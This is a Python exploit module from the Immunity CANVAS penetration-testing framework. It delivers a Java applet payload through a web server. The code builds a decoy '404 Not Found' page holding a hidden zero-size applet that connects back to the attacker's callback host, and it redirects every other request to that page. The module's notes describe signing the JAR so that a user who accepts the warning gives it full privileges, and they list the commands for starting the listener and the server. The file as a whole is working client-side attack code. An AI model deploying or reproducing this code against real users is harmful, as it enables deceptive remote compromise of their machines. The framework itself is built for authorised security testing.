#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2013
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import canvasengine
from exploitutils import *
from httpclientside import httpclientside

NAME                            = "java_generic_mosdef"
DESCRIPTION                     = "Java Generic Mosdef Applet"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Sun"
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"]       = "N/A"
DOCUMENTATION["CVE Url"]        = "N/A"
DOCUMENTATION["References"]     = ""
DOCUMENTATION["Date public"]    = ""
DOCUMENTATION["Notes"]         = """
This is a generic applet that simply runs a Java Mosdef payload.
Java 6 and 7 are supported.

In order for this to work, the jar file must be signed so that when the user
accepts the security warning the applet will run with full privileges.

Currently the JAR file for this exploit is not signed, so you can sign it with
whatever certificate you want.
The JAR file is located under the Resources directory for the current exploit.

In order to sign an applet you can follow this guide:
http://docs.oracle.com/javase/7/docs/technotes/guides/plugin/developer_guide/rsa_signing.html

Keytool documentation:
http://docs.oracle.com/javase/7/docs/technotes/tools/solaris/keytool.html

If you run this exploit and the JAR file is not signed, then it is likely that the end user will see
the security warning popup and even when accepting to run, nothing will happen on the CANVAS side
and you won't be getting a new node. This is simply because the Java Security Manager will
prevent the MOSDEF implementation from running properly.

To run from command line, first start the listener (UNIVERSAL):
python commandlineInterface.py -l 192.168.1.10 -p 5555 -v 17

And then run the exploit from clientd:
python ./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:java_generic_mosdef -O allowed_recon_modules:js_recon -O auto_detect_exploits:0

"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

TARGETS = { 0 : ["JDK/JRE 6"],
            1 : ["JDK/JRE 7"]
        }


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.htmlfile           = "index.html"
        # filename is used in the actual http server
        self.filename           = self.htmlfile
        self.jarfile            = "generic_mosdef.jar"
        self.jarfileName        = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".jar"
        # in standalone mode we want it to adhere
        # to manually chosen callback settings ...
        self.autoFind           = False
        # this exploit can not time out ...
        # it remains active in the browser ...
        self.refresh_rate       = 0
        self.resources_dir      = resources = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        return

    def neededListenerTypes(self):
        if self.HTTPMOSDEF:
            if self.useSSLMOSDEF:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def is_vulnerable( self, info_dict ):
        # simply assume target is vulnerable
        return 81

    def displayVersions(self):
        for t in TARGETS.keys():
            print "%d: %s" % (t, TARGETS[t][0])
        return

    def run(self):
        self.host       = self.target.interface
        self.htmlfile   = self.argsDict.get('htmlfile', self.htmlfile)
        html            = self.makefile()
        rar             = self.makedownloadfile()

        self.log("[+] Opening HTML %s for output" % self.htmlfile)
        fd = file(self.htmlfile, 'wb+')
        fd.write(html)
        fd.close()
        self.log("[+] wrote to %s" % self.htmlfile)

        self.log("[+] Opening JAR %s for output" % self.jarfile)
        fd = file(self.jarfile, 'wb+')
        fd.write(rar)
        fd.close()
        self.log("[+] Wrote to %s" % self.jarfile)

        self.log("[+] Place both files together in malicious webroot")
        return 1

    def makedownloadfile(self):
        return file(os.path.join(self.resources_dir,self.jarfile), 'rb').read()

    def makefile(self):
        html = """
        <html>
            <head>
                <title>404 Not Found</title>
            </head>
            <body>
                <!-- Site 404 Handler Applet -->
                <applet archive="%s" code="Main.class" width="0" height="0">
                    <param name="host" value="%s">
                    <param name="port" value="%d">
                    <param name="type" value="%d">
                    <param name="id" value="%d">
                    <param name="conn_type" value="%d">
                    <param name="use_ssl" value="%s">
                </applet>
                <h1>Not Found</h1>
                <p>The requested URL /%s was not found on this server.</p>
                <hr>
            </body>
        </html>
        """ % (self.jarfileName,
               self.callback.ip,
               self.callback.port,
               self.engine.getMosdefType(canvasengine.JAVASERVER),
               self.engine.getNewMosdefID(self),
               1 if self.HTTPMOSDEF else 0,
               str(self.useSSLMOSDEF).lower(),
               self.htmlfile)

        return html

    def makesploit(self, clientheader, clientbody):
        # we are platform independent
        from libs.spkproxy import header, body
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        request = clientheader.URL
        self.log("[+] Requesting: %s" % request)
        self.log("[+] User agent of connecting host: %s" % user_agent)

        if clientheader.URL.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())

        elif clientheader.URL.count(self.jarfileName):
            self.log("[+] Sending JAR")
            data = self.makedownloadfile()
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)

        elif clientheader.URL.count("done"):
            self.log("Did not load Java applet!")
            return None, None
        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')

        return h, b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

